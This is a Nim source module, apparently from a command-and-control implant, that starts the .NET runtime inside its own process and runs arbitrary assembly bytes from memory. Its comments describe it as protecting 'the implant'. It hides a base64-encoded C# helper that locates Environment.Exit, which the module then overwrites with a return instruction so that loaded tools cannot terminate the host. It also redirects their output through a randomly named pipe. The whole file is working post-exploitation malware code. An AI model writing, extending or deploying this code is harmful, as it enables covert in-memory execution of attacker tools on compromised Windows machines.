import ../rth
import ../../b64
import ../utils/utils
import ../utils/mem_helper
import winim
import winim/clr
import std/random


#[
  Starts the CLR by calling:
  - CLRCreateInstance()
  - GetRuntime()
  - IsLoadable()
  - GetInterface(CorRuntimeHost)
  - runtime.Start()
]#
proc startCLR(version = ""): ptr ICorRuntimeHost  =

  var
    hr: HRESULT
    metahost: ptr ICLRMetaHost
    runtimeInfo: ptr ICLRRuntimeInfo
    clrRuntimeHost: ptr ICLRRuntimeHost
    corRuntimeHost: ptr ICorRuntimeHost
    loadable: BOOL

  defer:
    if not metahost.isNil: metahost.Release()
    if not runtimeInfo.isNil: runtimeInfo.Release()
    if not clrRuntimeHost.isNil: clrRuntimeHost.Release()


  # Create the CLR Metahost Instance
  hr = CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, cast[ptr LPVOID](addr metahost))


  if hr != S_OK:
    DBG("[-] Unable to create metahost instance")
    return nil

  DBG("[+] Created metahost instance")

  hr = metahost.GetRuntime(version, &IID_ICLRRuntimeInfo, cast[ptr LPVOID](addr runtimeInfo))

  if hr != S_OK:
    DBG("[-] Unable to get runtime")
    return nil

  DBG("[+] Got Runtime for version & " & version)

  hr = runtimeInfo.IsLoadable(&loadable)

  if hr != S_OK:
    DBG("[-] Specified runtime is not loadable")
    return nil

  DBG("[+] Runtime is loadable")


  hr = runtimeInfo.GetInterface(&CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, cast[ptr LPVOID](addr corRuntimeHost))

  if hr != S_OK:
    DBG("[-] Unable to get interface of CLRCorRuntimeHost")
    return nil

  DBG("[+] Got Interface of CLRCorRuntimeHost")

  # Start the Runtime (Works if the CLR is already running)
  hr = corRuntimeHost.Start()

  if hr != S_OK:
    DBG("[-] Failed to Start corRuntimeHost")
    return nil
  DBG("[+] Started corRuntimeHost")

  return corRuntimeHost


#[
  Loads the CLR via startCLR(), creates a random Application Domain
  and uses Load_3 and Invoke_3 to execute the Assembly
]#
proc executeAssembly*(asmBytes: seq[byte], arguments: seq[string], version = "v4.0.30319", domainName = "rnd"): bool =


  var
    hr: HRESULT
    corRuntimeHost = startCLR(version)
    appDomainThunk: ptr IUnknown
    appDomain: ptr AppDomain
    assembly: ptr IAssembly
    methodInfo: ptr IMethodInfo
    asmSA: ptr SAFEARRAY         # The SAFEARRAY struct that will hold the assembly bytes
    asmSABound: SAFEARRAYBOUND   # The corresponding SAFEARRAYBOUND structure
    params: ptr SAFEARRAY        # The SAFEARRAY for the parameters/arguments for the assembly
    paramsBound: SAFEARRAYBOUND

  # Release everythting
  defer:
    if not corRuntimeHost.isNil:
      corRuntimeHost.UnloadDomain(appDomainThunk)
      corRuntimeHost.Release()
    if not appDomain.isNil: appDomain.Release()
    if not assembly.isNil: assembly.Release()
    if not asmSA.isNil: SafeArrayDestroy(asmSA)
    if not params.isNil: SafeArrayDestroy(params)
    if not appDomainThunk.isNil: appDomainThunk.Release()


  if corRuntimeHost == nil:
    DBG("[-] Failed to start CLR")
    return false

  # init app domain
  hr = corRuntimeHost.CreateDomain(domainName, nil, addr appDomainThunk)

  if FAILED(hr):
    DBG("[-] Failed to Create AppDomain")
    return false
  DBG("[+] Created Domain ")


  hr = appDomainThunk.QueryInterface(&IID_AppDomain, cast[ptr pointer](addr appDomain))

  if FAILED(hr):
    DBG("[-] Failed to Query Interface")
    return false
  DBG("[+] Successfully created Application Domain ")


  # Allocating SAFEARRAY with len(asmBytes) items
  asmSABound.cElements = cast[ULONG](len(asmBytes)) # number of elements
  asmSABound.lLbound = 0

  asmSA = SafeArrayCreate(VT_UI1, 1, addr asmSABound)
  var ptrData: pointer

  hr = SafeArrayAccessData(asmSA, addr ptrData)

  if FAILED(hr):
    DBG("[-] Failed to access data of SAFEARRAY")
    return false

  # Copy the assembly bytes into the SAFEARRAY
  copyMem(ptrData, unsafeAddr asmBytes[0], len(asmBytes))

  hr = SafeArrayUnaccessData(asmSA)

  # load the Assembly in the created Domain
  hr = appDomain.Load_3(asmSA, addr assembly)

  if FAILED(hr):
    DBG("[-] Failed to load Assembly: " & $cast[uint32](hr))
    return false

  DBG("[+] Assembly loaded successfully")

  # call the entrypoint
  assembly.get_EntryPoint(addr methodInfo)

  if FAILED(hr):
    DBG("[-] Failed to get EntryPoint")
    return false

  var obj: VARIANT
  var retVal: VARIANT
  obj.vt = VT_NULL
  obj.plVal = NULL

  # Parse the supplied arguments from a commandline string
  # to an array of strings
  #let arguments = parseCmdLine(arguments)

  # The argument variant
  var args: VARIANT
  args.vt = (VT_ARRAY or VT_BSTR)
  var argsBound: SAFEARRAYBOUND
  argsBound.lLbound = 0
  argsBound.cElements = cast[ULONG](len(arguments))
  args.parray = SafeArrayCreate(VT_BSTR, 1, addr argsBound)

  var idx: LONG = 0

  # Adding the arguments into the SAFEARRAY
  for arg in arguments:
    var tmpArg = SysAllocString(arg)
    SafeArrayPutElement(args.parray, addr idx, cast[pointer](tmpArg))
    idx += 1

  idx = 0 # reset to reuise index for the OUTER BSTR SAFEARRAY)

  # Create a new SAFEARRAY for a VT_VARIANT and put the BSTR Array
  # in this struct
  # -> SAFEARRAY(VT_VARIANT, SAFEARRAY(BSTR/VT_ARRAY, "one, two, tthree"))
  paramsBound.lLbound = 0
  paramsBound.cElements = 1
  params = SafeArrayCreate(VT_VARIANT, 1, addr paramsBound)
  SafeArrayPutElement(params, addr idx, addr args)

  # Invoke the Assembly
  hr = methodInfo.Invoke_3(obj, params, addr retVal)

  if FAILED(hr):
    DBG("[-] Failed to execute EntryPoint " & $cast[uint32](hr))
    return false

  DBG("[+] Execution finishes :)")
  return true



#[
  Executes a .NET assembly in the memory of the current
  process. The communication is implemented via NamedPipes
  to redirect the stdin/stdout and stderr.
]#

var isExitPatched: ptr bool = cast[ptr bool](allocShared(sizeof(bool)))
isExitPatched[] = false


proc patchExit(): bool =

  var oldProtect: DWORD
  var status: bool
  # Ret Instruction
  var patchBytes: seq[byte] = @[byte 0xc3]


  # The following code snippet (.NET) gets the Address for the Environment.Exit function
  #[
    using System;
    using System.Collections.Generic;
    using System.Reflection;

      public class Patcher {
        public long patch()
        {
          var methods = new List<MethodInfo>(typeof(Environment).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic));
          var exitMethod = methods.Find((MethodInfo mi) => mi.Name == "Exit");
          System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(exitMethod.MethodHandle);
          var exitMethodPtr = exitMethod.MethodHandle.GetFunctionPointer();
          IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();
          return (long)target;
        }
      }
    ]#

  let getAddrCode = "ICAgIHVzaW5nIFN5c3RlbTsKICAgIHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOwogICAgdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247CgogICAgICBwdWJsaWMgY2xhc3MgUGF0Y2hlciB7CiAgICAgICAgcHVibGljIGxvbmcgcGF0Y2goKQogICAgICAgIHsKICAgICAgICAgIHZhciBtZXRob2RzID0gbmV3IExpc3Q8TWV0aG9kSW5mbz4odHlwZW9mKEVudmlyb25tZW50KS5HZXRNZXRob2RzKEJpbmRpbmdGbGFncy5TdGF0aWMgfCBCaW5kaW5nRmxhZ3MuUHVibGljIHwgQmluZGluZ0ZsYWdzLk5vblB1YmxpYykpOwogICAgICAgICAgdmFyIGV4aXRNZXRob2QgPSBtZXRob2RzLkZpbmQoKE1ldGhvZEluZm8gbWkpID0+IG1pLk5hbWUgPT0gIkV4aXQiKTsKICAgICAgICAgIFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMuUnVudGltZUhlbHBlcnMuUHJlcGFyZU1ldGhvZChleGl0TWV0aG9kLk1ldGhvZEhhbmRsZSk7CiAgICAgICAgICB2YXIgZXhpdE1ldGhvZFB0ciA9IGV4aXRNZXRob2QuTWV0aG9kSGFuZGxlLkdldEZ1bmN0aW9uUG9pbnRlcigpOwogICAgICAgICAgSW50UHRyIHRhcmdldCA9IGV4aXRNZXRob2QuTWV0aG9kSGFuZGxlLkdldEZ1bmN0aW9uUG9pbnRlcigpOwogICAgICAgICAgcmV0dXJuIChsb25nKXRhcmdldDsKICAgICAgICB9CiAgICAgIH0K"

  # Decode the base64 blob to the source-code string
  let rawGetAddrCode = cast[string](b64.decode(Base64Pad, getAddrCode))
  var compResult = compile(rawGetAddrCode)
  var patcher = compResult.CompiledAssembly.new("Patcher")
  let addressExit = int64(patcher.patch())

  #DBG("[+] Address of Environment.Exit() @ {addressExit:#X}")

  # The next code is used to make the memory segment
  # writable, patch the instruction to a `return` and
  # restore the access protections

  if not protectAndWrite(unsafeAddr patchBytes[0], patchBytes.len, cast[pointer](addressExit)):
    DBG("[-] Failed to apply Exit patch")
    return false
  DBG("[+] Successfully applied Exit patch")
  return true

#[
  Creates a named pipe that is used to obtain
  the output of the assembly that gets executed.
]#
proc makeNamedPipe(pipeName: string): HANDLE  =

  let handle = CreateNamedPipe(pipeName,
    PIPE_ACCESS_DUPLEX.or(FILE_FLAG_FIRST_PIPE_INSTANCE),
    PIPE_TYPE_MESSAGE,
    PIPE_UNLIMITED_INSTANCES,
    65535, 65535, 0, NULL);

  if handle == INVALID_HANDLE_VALUE:
    DBG("[-] Failed to get Handle to Named Pipe")
    DBG("    Error: " & $GetLastError())
    return INVALID_HANDLE_VALUE
  else:
    DBG("[+] Successfully created NamedPipeHandle")
    return handle


#[
  Read the messages from the Named Pipe
]#
proc readPipe(pipeHandle: HANDLE): string  =

  let bytesToRead: DWORD = 65535
  var bytesRead: DWORD
  var outputBuffer = alloc(bytesToRead)
  # to not have any memory residue that gets returned
  zeroMem(outputBuffer, bytesToRead)

  var success = ReadFile(pipeHandle, outputBuffer, bytesToRead, addr bytesRead, cast[LPOVERLAPPED](0));

  # Return the buffer that is read
  if success:
    return outputBuffer.toString()
  else:
    return "<failed to read stdout>"



proc execute*(payload: var Payload): bool =

  # Timeline Logging
  #logExecToTimeline(payload, "Execute-Assembly")

  var success: bool
  var backupStdoutHandle: HANDLE
  var hFile: HANDLE
  var pipeHandle: HANDLE


  # Patch the Environment.Exit() function call to
  # prevent any C# code from crashing the implant
  let ep: ptr bool = cast[ptr bool](isExitPatched)

  if ep[] == false:
      success =  patchExit()

      if success:
        DBG("[+] Successfullt patched Environment.Exit()")
        ep[] = true
      else:
        DBG("[-] Failed to patch Environment.Exit()")

  # Load and execute the Assembly
  DBG("[*] Loading assembly bytes")

  # We want to redirect the STDOUT of the assembly
  if payload.redirectStdout:
    DBG("[*] Redirecting Stdout")
    let pipeName = "\\\\.\\pipe\\oandomname_" & $rand(9999)
    DBG("[*] Created NamedPipe: " & pipeName)
    pipeHandle = makeNamedPipe(pipeName)

    # Create a File Object from the Named Pipe
    hFile = CreateFile(T(pipeName), GENERIC_WRITE, FILE_SHARE_READ, cast[LPSECURITY_ATTRIBUTES](0), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

    if hFile == INVALID_HANDLE_VALUE:
      DBG("[-] Failed to create File handle")
    else:
      DBG("[+] Successfully created File handle")


    backupStdoutHandle = GetStdHandle(STD_OUTPUT_HANDLE)
    # flush stdout
    FlushFileBuffers(STD_OUTPUT_HANDLE)

    # set the new handle of the Mailbox
    success = SetStdHandle(STD_OUTPUT_HANDLE, hFile)
    if success:
      DBG("[+] Successfully redirected STDOUT")
    else:
      DBG("[-] Failed to redirect STDOUT")


  try:

    # Execute the Assembly
    discard executeAssembly(payload.bytes, payload.arguments)

  except:
    DBG("[-] Something went wrong, just dont crash")
    DBG(getCurrentExceptionMsg())
    return false

  # If redirection is required,
  # read the output form the Mailbox and
  # store it in the struct + reset the Handle
  # to stdout
  if payload.redirectStdout:
    #success = SetStdHandle(cast[DWORD](backupStdoutHandle), hFile)
    # reset the STD Handle

    DBG("reading pipe...")
    # reading messages
    payload.output = readPipe(pipeHandle)


    DBG("-- Output --")
    DBG(payload.output)

    CloseHandle(hFile)
    CloseHandle(pipeHandle)

    success = SetStdHandle(STD_OUTPUT_HANDLE, backupStdoutHandle)

    if success:
      DBG("[+] Successfully restored STDOUT")
    else:
      DBG("[-] Failed to restore STDOUT")

    # Cleaning up and closing the handles
    DBG("[+] Closed Handles")


  return true

